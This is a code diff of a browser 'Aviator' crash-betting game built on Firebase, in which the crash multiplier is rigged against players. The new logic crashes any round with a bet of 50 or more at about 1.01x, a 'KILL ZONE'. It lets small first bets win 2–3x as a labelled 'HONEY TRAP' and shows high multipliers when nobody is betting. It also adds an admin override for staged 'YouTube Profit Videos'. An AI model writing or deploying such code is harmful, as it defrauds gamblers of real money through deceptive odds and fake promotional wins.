@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aviator: Pure Bot Edition</title>
+    <title>Aviator Pro: Fast & Smart</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -17,7 +17,7 @@
         .history-top { display: flex; gap: 6px; padding: 5px 0; overflow-x: auto; scrollbar-width: none; }
         .hist-chip { padding: 2px 10px; border-radius: 10px; font-size: 10px; background: #2c2d30; border: 1px solid #444; flex-shrink: 0; font-weight: bold; }
         .game-canvas { position: relative; width: 100%; height: 200px; background: #000; overflow: hidden; border-bottom: 2px solid #1b1c1d; }
-        #mult-text { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); font-size: 45px; font-weight: 900; z-index: 10; }
+        #mult-text { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); font-size: 45px; font-weight: 900; z-index: 10; transition: color 0.2s; }
         #dot-object { position: absolute; bottom: 20px; left: 20px; width: 14px; height: 14px; background: #ff0040; border-radius: 50%; z-index: 25; box-shadow: 0 0 15px #ff0040; }
         #trail-svg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; }
         .content-area { flex-grow: 1; padding: 8px; background: #000; overflow-y: auto; }
@@ -83,6 +83,7 @@
     const userId = localStorage.getItem('jalwa_user_phone') || "Guest";
 
     let wallet = 0, multiplier = 1.0, gameStatus = "waiting", targetCrash = 2.0, serverOffset = 0, currentPeriod = "";
+    let animationId;
     let bets = { 1: { active: false, amt: 0, waiting: false }, 2: { active: false, amt: 0, waiting: false } };
 
     db.ref(".info/serverTimeOffset").on("value", s => serverOffset = s.val() || 0);
@@ -94,43 +95,53 @@
         return { period: dateStr + String(Math.floor(totalSec/20)).padStart(4,'0'), ms: (totalSec % 20) * 1000 + now.getMilliseconds() };
     }
 
-    // --- PURE BOT LOGIC (NO ADMIN) ---
-    async function calculateBotTarget() {
+    // --- HYBRID LOGIC (ADMIN + BOT) ---
+    async function calculateTarget() {
+        const adminSnap = await db.ref('gameSettings/aviator').once('value');
+        const admin = adminSnap.val();
+        
+        // 1. Admin Control (For YouTube Profit Videos)
+        if (admin && admin.forceActive) return parseFloat(admin.manualCrash);
+
+        // 2. Bot Logic
         const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
-        let totalAmt = 0;
-        let highestBet = 0;
-
-        const userStats = await db.ref('users/' + userId + '/stats').once('value');
-        let betCount = (userStats.val() && userStats.val().totalBets) || 0;
-
+        let totalAmt = 0; let highBet = false;
         if (betSnap.exists()) {
             betSnap.forEach(snap => {
                 let amt = parseFloat(snap.val().amt);
                 totalAmt += amt;
-                if (amt > highestBet) highestBet = amt;
+                if (amt >= 50) highBet = true; // Rule: 50+ bet = Instant Kill
             });
         }
 
-        console.log("Stats -> Total:", totalAmt, "Highest:", highestBet, "Count:", betCount);
+        const userStats = await db.ref('users/' + userId + '/stats').once('value');
+        let count = (userStats.val() && userStats.val().totalBets) || 0;
 
-        // 1. KILL RULE: Agar total bet ₹50 se upar hai YA teri bet ₹150+ hai YA teri 4th bet se jyada hai
-        if (totalAmt > 50 || highestBet >= 150 || betCount >= 4) {
-            return (Math.random() * 0.08 + 1.01).toFixed(2); // 1.01 - 1.09 pe khatam
-        } 
-        // 2. CHUTPUT RULE: Shuruat ki choti bets (₹10-20)
-        else if (totalAmt > 0 && totalAmt <= 50 && betCount < 4) {
-            return (Math.random() * 1.0 + 2.0).toFixed(2); // 2.0 - 3.0 tak jitao
-        } 
-        // 3. LALACH RULE: Jab koi khel hi nahi raha
-        else {
-            return (Math.random() * 10 + 5).toFixed(2); // 5.0 - 15.0 tak udne do
+        if (highBet || totalAmt > 100 || count >= 5) {
+            return (Math.random() * 0.08 + 1.01).toFixed(2); // KILL ZONE
+        } else if (totalAmt > 0) {
+            return (Math.random() * 1.5 + 2.1).toFixed(2); // HONEY TRAP (2x-3x)
+        } else {
+            return (Math.random() * 8 + 4).toFixed(2); // IDLE SHOW (4x-12x)
         }
     }
 
     async function updateNewRound() {
-        targetCrash = await calculateBotTarget();
-        console.log("Bot decided Crash at: " + targetCrash);
+        targetCrash = await calculateTarget();
         db.ref('gameSettings/aviator/liveBets').remove(); 
+    }
+
+    function triggerCrash() {
+        if(gameStatus === "flew") return;
+        gameStatus = "flew";
+        document.getElementById('mult-text').innerText = "FLEW AWAY!";
+        document.getElementById('mult-text').style.color = "#ff0040";
+        
+        [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
+        db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
+        
+        // Fast UI Reset
+        setTimeout(() => { resetPlane(); document.getElementById('mult-text').style.color = "#fff"; }, 1500);
     }
 
     function loop() {
@@ -141,10 +152,12 @@
         }
 
         if (sync.ms < 5000) {
-            gameStatus = "waiting"; multiplier = 1.0; resetPlane();
+            gameStatus = "waiting"; multiplier = 1.0; 
             document.getElementById('mult-text').innerText = "WAITING " + (5 - (sync.ms/1000)).toFixed(1) + "s";
             [1,2].forEach(id => { if(!bets[id].waiting) resetBtn(id); });
-        } else if (sync.ms < 16000) {
+        } else if (sync.ms < 17000) {
+            if(gameStatus === "flew") { animationId = requestAnimationFrame(loop); return; }
+            
             let time = (sync.ms - 5000) / 1000;
             multiplier = Math.pow(1.15, time * 1.5);
             
@@ -161,21 +174,16 @@
                     }
                     if(bets[id].active) document.getElementById('s'+id).innerText = (bets[id].amt * multiplier).toFixed(2) + " Rs";
                 });
-                updatePlanePos(time * 30);
+                updatePlanePos(time * 35);
             }
-        } else triggerCrash();
-        requestAnimationFrame(loop);
-    }
-
-    function triggerCrash() {
-        if(gameStatus === "flew") return;
-        gameStatus = "flew"; document.getElementById('mult-text').innerText = "FLEW AWAY!";
-        [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
-        db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
+        } else {
+            triggerCrash();
+        }
+        animationId = requestAnimationFrame(loop);
     }
 
     function updatePlanePos(f) {
-        let x = 20 + (f * 2.5), y = 20 + (Math.pow(f / 15, 2.3));
+        let x = 20 + (f * 2.8), y = 20 + (Math.pow(f / 14, 2.4));
         let dot = document.getElementById('dot-object');
         dot.style.left = Math.min(x, 280) + "px"; dot.style.bottom = Math.min(y, 180) + "px";
         document.getElementById('trail-path-line').setAttribute('d', `M 20 180 Q 80 180 ${x} ${200-y}`);
@@ -215,7 +223,7 @@
         document.getElementById('histLine').innerHTML = h;
     });
 
-    requestAnimationFrame(loop);
+    animationId = requestAnimationFrame(loop);
 </script>
 </body>
 </html>
